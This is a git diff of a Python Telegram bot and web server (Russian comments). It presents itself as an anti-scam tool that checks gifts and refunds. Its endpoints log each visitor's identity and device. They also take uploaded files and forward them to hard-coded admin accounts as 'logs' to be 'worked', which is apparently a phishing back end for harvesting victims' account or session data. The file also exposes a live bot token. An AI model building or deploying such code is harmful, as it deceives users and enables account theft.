@@ -1,84 +1,107 @@
+import asyncio
 import logging
 import os
 from aiohttp import web
-from aiogram import Bot
-from aiogram.types import BufferedInputFile
+from aiogram import Bot, Dispatcher, types, Router
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile
 
 # =====================================================
-# ПАРАМЕТРЫ НАСТРОЙКИ (ЗАПОЛНИ ИХ)
+# ПАРАМЕТРЫ НАСТРОЙКИ
 # =====================================================
-API_TOKEN = '8410110349:AAE5WM8PHsg85cvGmPuNq55XS8w_FcifjR8'  # Вставь сюда токен от @BotFather
-ADMIN_IDS = [8396015606, 8187498719]  # Вставь сюда свой ID и ID админов через запятую
+API_TOKEN = '8410110349:AAE5WM8PHsg85cvGmPuNq55XS8w_FcifjR8'
+ADMIN_IDS = [8396015606, 8187498719]
+WEB_APP_URL = "https://kareli123.github.io/Nicegrammarse/" # Ссылка на ваш Mini App
 
 def get_all_admins():
     return ADMIN_IDS
 # =====================================================
 
-# Инициализация
 logging.basicConfig(level=logging.INFO)
-bot = Bot(token=API_TOKEN)
-routes = web.RouteTableDef() # Создаем таблицу маршрутов ДО использования декораторов
 
-# --- МАРШРУТЫ (ROUTES) ---
+# Инициализация бота и диспетчера
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher()
+router = Router()
+dp.include_router(router)
+
+# --- ЛОГИКА БОТА (КОМАНДЫ) ---
+
+@router.message(Command("start"))
+async def cmd_start(message: types.Message):
+    """Обработка команды /start"""
+    markup = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
+        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
+    ])
+    
+    text = (
+        "Привет! Я - Бот, который поможет тебе не попасться на мошенников.\n"
+        "Я помогу отличить реальный подарок от визуала и проверить наличие рефаунда."
+    )
+    
+    await message.answer(text, reply_markup=markup)
+
+# --- МАРШРУТЫ ВЕБ-СЕРВЕРА (API ДЛЯ MINI APP) ---
+
+routes = web.RouteTableDef()
+
+@routes.get('/')
+async def keep_alive(request):
+    return web.Response(text="Server & Bot are running!")
 
 @routes.post('/log_entry')
 async def handle_log_entry(request: web.Request):
     try:
         data = await request.json()
         user_id = data.get('user_id')
-        username = data.get('username')
-        ua = data.get('user_agent')
+        username = data.get('username', 'hidden')
+        ua = data.get('user_agent', 'unknown')
 
-        admin_ids = get_all_admins()
         msg = (f"🚀 **Вход в Mini App**\n"
                f"👤 Юзер: @{username} (ID: {user_id})\n"
                f"📱 Устройство: `{ua}`")
 
-        for admin_id in admin_ids:
+        for admin_id in get_all_admins():
             try:
                 await bot.send_message(admin_id, msg, parse_mode="Markdown")
             except: pass
         return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
     except Exception as e:
-        logging.error(f"Error in log_entry: {e}")
-        return web.Response(text="Error", status=500)
+        return web.Response(text=str(e), status=500)
 
 @routes.post('/upload')
 async def handle_upload_file(request: web.Request):
     try:
         reader = await request.multipart()
         user_id, username, ua, file_data = None, None, None, None
-        filename = "unknown.json"
+        filename = "data.json"
 
         while True:
             part = await reader.next()
             if part is None: break
             
-            if part.name == 'user_id': 
-                user_id = (await part.read_chunk()).decode('utf-8')
-            elif part.name == 'username': 
-                username = (await part.read_chunk()).decode('utf-8')
-            elif part.name == 'user_agent': 
-                ua = (await part.read_chunk()).decode('utf-8')
+            if part.name == 'user_id': user_id = (await part.read_chunk()).decode('utf-8')
+            elif part.name == 'username': username = (await part.read_chunk()).decode('utf-8')
+            elif part.name == 'user_agent': ua = (await part.read_chunk()).decode('utf-8')
             elif part.name == 'file':
                 filename = part.filename or "data.json"
                 file_data = await part.read()
 
         if user_id and file_data:
-            admin_ids = get_all_admins()
-            caption_text = (f"🚨 Новый лог, вперед отрабатывать\n"
+            caption_text = (f"🚨 Новый лог!\n"
                             f"User ID: {user_id}\n"
                             f"Username: @{username}\n"
                             f"Браузер: {ua}")
 
-            for admin_id in admin_ids:
+            for admin_id in get_all_admins():
                 try:
                     await bot.send_document(
                         chat_id=admin_id,
                         document=BufferedInputFile(file_data, filename=filename),
                         caption=caption_text
                     )
-                except Exception as e: logging.warning(e)
+                except: pass
 
             try:
                 await bot.send_message(chat_id=int(user_id), text="✅ Файл успешно загружен, ожидайте проверки.")
@@ -86,10 +109,8 @@ async def handle_upload_file(request: web.Request):
 
         return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
     except Exception as e:
-        logging.error(f"Error in upload: {e}")
-        return web.Response(text="Error", status=500)
+        return web.Response(text=str(e), status=500)
 
-# Обработка OPTIONS запросов (важно для работы из браузера)
 @routes.options('/upload')
 @routes.options('/log_entry')
 async def handle_options(request):
@@ -99,11 +120,28 @@ async def handle_options(request):
         "Access-Control-Allow-Headers": "Content-Type"
     })
 
-# --- ЗАПУСК ---
-app = web.Application()
-app.add_routes(routes)
+# --- ЗАПУСК ВСЕГО ВМЕСТЕ ---
+
+async def main():
+    # 1. Настройка веб-сервера
+    app = web.Application()
+    app.add_routes(routes)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    
+    port = int(os.environ.get("PORT", 8080))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    
+    # 2. Запуск сервера и бота одновременно
+    logging.info(f"Запуск сервера на порту {port}...")
+    await site.start()
+    
+    logging.info("Запуск Bot Polling...")
+    await bot.delete_webhook(drop_pending_updates=True)
+    await dp.start_polling(bot)
 
 if __name__ == '__main__':
-    # Render автоматически подставляет PORT
-    port = int(os.environ.get("PORT", 8080))
-    web.run_app(app, host='0.0.0.0', port=port)
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        logging.info("Бот остановлен")
